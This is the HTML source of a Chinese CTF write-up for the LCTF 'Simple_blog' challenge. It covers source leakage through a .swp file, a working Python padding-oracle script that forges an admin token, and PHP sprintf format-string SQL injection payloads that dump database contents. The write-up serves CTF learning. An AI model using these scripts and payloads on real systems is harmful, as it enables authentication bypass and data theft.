@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 扫描目录 &amp;amp; 源码泄露 御剑后台扫描工具   ​     下载地址：http://www.moonsec.com/post-753.html  AWVS   脚本扫描    swp文件恢复：   非正常关闭vi编辑器时会生成一个.swp文件 关于swp文件 使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LCTF Simple_blog WP">
+<meta property="og:url" content="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/index.html">
+<meta property="og:site_name" content="m3lon">
+<meta property="og:description" content="0x01 扫描目录 &amp;amp; 源码泄露 御剑后台扫描工具   ​     下载地址：http://www.moonsec.com/post-753.html  AWVS   脚本扫描    swp文件恢复：   非正常关闭vi编辑器时会生成一个.swp文件 关于swp文件 使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/LCTF-Simple-blog-WP/1.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/LCTF-Simple-blog-WP/2.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/LCTF-Simple-blog-WP/3.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/LCTF-Simple-blog-WP/4.png">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/8.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/17.png?raw=true">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/LCTF-Simple-blog-WP/5.png">
+<meta property="og:updated_time" content="2018-05-10T09:02:17.151Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LCTF Simple_blog WP">
+<meta name="twitter:description" content="0x01 扫描目录 &amp;amp; 源码泄露 御剑后台扫描工具   ​     下载地址：http://www.moonsec.com/post-753.html  AWVS   脚本扫描    swp文件恢复：   非正常关闭vi编辑器时会生成一个.swp文件 关于swp文件 使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/LCTF-Simple-blog-WP/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/">
+
+
+
+
+
+  <title>LCTF Simple_blog WP | m3lon</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113184689-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+  <style>
+	blockquote {
+	  color: #888;
+	  background-color: #eae6f3;
+	  border-left: 1rem solid #5236a0;
+	  padding: 0 1.5rem;
+	  position: relative;
+	  font-family: 'Roboto', sans-serif;
+	}
+
+	blockquote:before,
+	blockquote:after {
+	  color: #392570;
+	  font-size: 2.5rem;
+	  position: absolute;
+	  line-height: 2.5rem;
+	}
+
+	blockquote:before {
+	  content: "\201C";
+	  left: -1rem;
+	  top: 0;
+	}
+
+	blockquote:after {
+	  content: "\201D";
+	  right: 0;
+	  bottom: -1rem;
+	}
+</style>
+</head>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">m3lon</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2018/05/10/LCTF-Simple-blog-WP/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m3lon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/UMR.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m3lon">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">LCTF Simple_blog WP</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-10T16:58:02+08:00">
+                2018-05-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i> 浏览量
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x01-扫描目录-amp-源码泄露"><a href="#0x01-扫描目录-amp-源码泄露" class="headerlink" title="0x01 扫描目录 &amp; 源码泄露"></a>0x01 扫描目录 &amp; 源码泄露</h3><ul>
+<li>御剑后台扫描工具</li>
+</ul>
+<p><img src="LCTF-Simple-blog-WP/1.png" alt=""></p>
+<p>​     下载地址：<a href="http://www.moonsec.com/post-753.html" target="_blank" rel="noopener">http://www.moonsec.com/post-753.html</a></p>
+<ul>
+<li><p>AWVS</p>
+<p><img src="LCTF-Simple-blog-WP/2.png" alt=""></p>
+</li>
+<li><p>脚本扫描</p>
+<p><img src="LCTF-Simple-blog-WP/3.png" alt=""></p>
+</li>
+</ul>
+<p><strong>swp文件恢复</strong>： </p>
+<blockquote>
+<p>非正常关闭vi编辑器时会生成一个.swp文件</p>
+<p>关于swp文件</p>
+<p>使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件 以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除 。下面说不测。</p>
+<p>不测分为：</p>
+<ul>
+<li>当你用多个程序编辑同一个文件时。</li>
+<li>非常规退出时。</li>
+</ul>
+<p>第一种情况的话，为了避免同一个文件产生两个不同的版本（vim中的原话），还是建议选择readonly为好。</p>
+<p>第二种情况的话，你可以用vim -r filename恢复，然后再把swp文件删除（这个时候要确保你的swp文件没有用处了，要不然你会伤心的）</p>
+<p>swp文件的来历，当你强行关闭vi时，比如电源突然断掉或者你使用了Ctrl+ZZ，vi自动生成一个.swp文件，下次你再编辑时，就会出现一些提示。</p>
+<p>你可以使用</p>
+<p>​    <code>vi -r {your file name}</code></p>
+</blockquote>
+<h3 id="0x02-Padding-Oracle-Attack"><a href="#0x02-Padding-Oracle-Attack" class="headerlink" title="0x02 Padding Oracle Attack"></a>0x02 Padding Oracle Attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">'http://192.168.5.14/LCTF2017-master/src/web/simple-blog/src/login.php'</span></span><br><span class="line">N=<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_token</span><span class="params">(token)</span>:</span></span><br><span class="line">    header=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID="</span>+phpsession+<span class="string">";token="</span>+token&#125;</span><br><span class="line">    result=requests.post(url,headers=header)</span><br><span class="line">    <span class="keyword">print</span>  header</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string,N)</span>:</span></span><br><span class="line">    l=len(string)</span><br><span class="line">    <span class="keyword">if</span> l!=N:</span><br><span class="line">        <span class="keyword">return</span> string+chr(N-l)*(N-l)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></span><br><span class="line">    get=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,N+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            padding=xor(get,chr(i)*(i<span class="number">-1</span>))</span><br><span class="line">            c=chr(<span class="number">0</span>)*(<span class="number">16</span>-i)+chr(j)+padding</span><br><span class="line">            result=inject_token(base64.b64encode(c))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                get=chr(j^i)+get</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">        <span class="string">"password"</span>:<span class="string">"admin"</span></span><br><span class="line">    &#125;</span><br><span class="line">    coo1 = &#123;</span><br><span class="line">        <span class="string">"PHPSESSID"</span>:<span class="string">"h1frvln4me27ponpjt9vk8o5o1"</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url,cookies=coo1,data=payload,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">print</span> r.headers</span><br><span class="line">    token = r.headers[<span class="string">'Set-Cookie'</span>][<span class="number">6</span>:].replace(<span class="string">"%3D"</span>,<span class="string">'='</span>).replace(<span class="string">"%2F"</span>,<span class="string">'/'</span>).replace(<span class="string">"%2B"</span>,<span class="string">'+'</span>).decode(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">print</span> token</span><br><span class="line">    session = <span class="string">"h1frvln4me27ponpjt9vk8o5o1"</span></span><br><span class="line">    <span class="keyword">return</span> session, token</span><br><span class="line"><span class="comment"># print inject_token(token).content</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    phpsession,token = login(url)</span><br><span class="line">    middle1=padding_oracle(N)</span><br><span class="line">    <span class="keyword">print</span> middle1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">    <span class="keyword">if</span>(len(middle1)+<span class="number">1</span>==<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            middle=chr(i)+middle1</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"token:"</span>+token</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"middle:"</span>+middle</span><br><span class="line">            plaintext=xor(middle,token);</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"plaintext:"</span>+plaintext</span><br><span class="line">            des=pad(<span class="string">'admin'</span>,N)</span><br><span class="line">            tmp=<span class="string">""</span></span><br><span class="line">            <span class="keyword">print</span> des.encode(<span class="string">"base64"</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">                tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))</span><br><span class="line">            <span class="keyword">print</span> tmp.encode(<span class="string">'base64'</span>)</span><br><span class="line">            result=inject_token(base64.b64encode(tmp))</span><br><span class="line">            <span class="keyword">print</span> result.content</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Login Form"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content <span class="keyword">and</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                <span class="keyword">print</span> result.content</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"success"</span></span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
+<p><img src="LCTF-Simple-blog-WP/4.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSION:h1frvln4me27ponpjt9vk8o5o1</span><br><span class="line">token:VB9BCGFpdhQBi9NcSQdbg==</span><br></pre></td></tr></table></figure>
+<p>修改token，成功登陆进后台，admin源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</span><br><span class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$title = <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line">	$result = mysql_query($sql,$con);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在看到sprintf后，可以很直接的联系到前阵子爆出的关于wordpress的格式化字符串SQL注入漏洞。传送门： <a href="https://paper.seebug.org/386/" target="_blank" rel="noopener">从WordPress SQLi谈PHP格式化字符串问题（2017.11.01更新）</a></p>
+<h3 id="PHP格式化字符串漏洞"><a href="#PHP格式化字符串漏洞" class="headerlink" title="PHP格式化字符串漏洞"></a>PHP格式化字符串漏洞</h3><p>基于泄露出的源码，添加一些变量打印语句，本地测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con = mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">	print_r(&quot;GET[id] =&gt; &quot;.$_GET[&apos;id&apos;].&quot;&lt;/br&gt;&quot;);</span><br><span class="line">	$id = mysql_real_escape_string($_GET[&apos;id&apos;],$con);</span><br><span class="line">	print_r(&quot;\$id =&gt; &quot;.$id.&quot;&lt;/br&gt;&quot;);</span><br><span class="line"></span><br><span class="line">	if(isset($_GET[&apos;title&apos;]))&#123;</span><br><span class="line">		print_r(&quot;GET[title] =&gt; &quot;.$_GET[&apos;title&apos;].&quot;&lt;/br&gt;&quot;);</span><br><span class="line">		$title = mysql_real_escape_string($_GET[&apos;title&apos;]);</span><br><span class="line">		print_r(&quot;escape string tile: \$title =&gt; &quot;.$title.&quot;&lt;/br&gt;&quot;);</span><br><span class="line">		$title = sprintf(&quot;AND title=&apos;%s&apos;&quot;, $title);</span><br><span class="line">		print_r(&quot;After first sprintf : \$title =&gt; &quot;.$title.&quot;&lt;/br&gt;&quot;);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$title = &apos;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$sql = sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; $title&quot;, $id);</span><br><span class="line">	print_r(&quot;sql =&gt; &quot;.$sql);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2500/index.php?id=1&amp;title=flag%1$&apos;%20 or 1=1%23</span><br></pre></td></tr></table></figure>
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/8.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/8.png?raw=true" alt="img"></a></p>
+<p>观察传入的title参数。</p>
+<p>title传入的值为<code>flag%1$&#39; or 1=1#</code>，经过<code>mysql_real_escape_string</code>，会使得单引号<code>&#39;</code>前加上斜杠，也就是图片中的第四行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape string tile: $title =&gt; flag%1$\&apos; or 1=1#</span><br></pre></td></tr></table></figure>
+<p>接下来执行一次<code>sprintf(&quot;AND title=&#39;%s&#39;&quot;, $title);</code>，也就是将前面得到的title值title值为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">After first sprintf : $title =&gt; AND title=&apos;flag%1$\&apos; or 1=1#&apos;</span><br></pre></td></tr></table></figure>
+<p>接下来，又一次执行了<code>sprintf</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; AND title=&apos;flag%1$\&apos; or 1=1#&apos;&quot;, $id);</span><br></pre></td></tr></table></figure>
+<p>由于PHP的sprintf中，<code>%1$\</code>这样的语法，百分号<code>%</code>后面的数表示使用第几个参数，<code>$</code>后面的表示类型，常见的类型比如<code>s</code>表示字符串等等。比如<code>%1$s</code>，表示使用第一个参数，类型为字符串（%s）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 注format中，为防止 $ 被转义，在前面加了转义符。对于sprintf来说，即 %1$s</span><br><span class="line">$format1 = &quot;hello,%1\$s one&lt;br/&gt;&quot;;</span><br><span class="line">$format2 = &quot;hello,%2\$s two&lt;br/&gt;&quot;;</span><br><span class="line">$format3 = &quot;hello,%1\$\&apos; three&lt;br/&gt;&quot;;</span><br><span class="line">$format4 = &quot;hello,%\$\&apos; four&lt;br/&gt;&quot;;</span><br><span class="line"></span><br><span class="line">print_r(&quot;format string 1 : &quot;.$format1);</span><br><span class="line">print_r(&quot;Result: &quot;.sprintf($format1,&quot;chybeta-1&quot;,&quot;chybeta-2&quot;));</span><br><span class="line"></span><br><span class="line">print_r(&quot;format string 2 : &quot;.$format2);</span><br><span class="line">print_r(&quot;Result: &quot;.sprintf($format2,&quot;chybeta-1&quot;,&quot;chybeta-2&quot;));</span><br><span class="line"></span><br><span class="line">print_r(&quot;format string 3 : &quot;.$format3);</span><br><span class="line">print_r(sprintf($format3,&quot;chybeta-1&quot;,&quot;chybeta-2&quot;));</span><br><span class="line"></span><br><span class="line">print_r(&quot;format string 4 : &quot;.$format4);</span><br><span class="line">print_r(sprintf($format4,&quot;chybeta-1&quot;,&quot;chybeta-2&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/17.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/17.png?raw=true" alt="img"></a></p>
+<p>前两个示例是演示选择参数的用法。第三个和前两个比较，变成类型<code>%\</code>，会直接跳过不处理，并直接输出。第四个和第三个对比，少了参数选择，这会导致报错，无法正常打印。</p>
+<p>回到前面的sprintf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' AND title='flag%1$\' or 1=1#'"</span>, $id);</span><br></pre></td></tr></table></figure>
+<p>通过百分号后的1，选择了一个参数（即id）不会爆错。利用类型<code>%\</code>，使得跳过。而原本在<code>\</code>后面的单引号，由于前面斜杠被当作了sprintf的类型，得以成功逃逸。</p>
+<p>剩下的工作就是payload的编写了</p>
+<p>测试payload:<code>?id=0&amp;title=%1$%27%20union%20select%201,2,3%23</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload = "%1$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#"  #注表名</span></span><br><span class="line"><span class="comment">#payload = "%1$' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x4b4559#"    #注列名</span></span><br><span class="line">payload = <span class="string">"%1$' union select 1,2,f14g from `key`#"</span> <span class="comment">#注字段</span></span><br></pre></td></tr></table></figure>
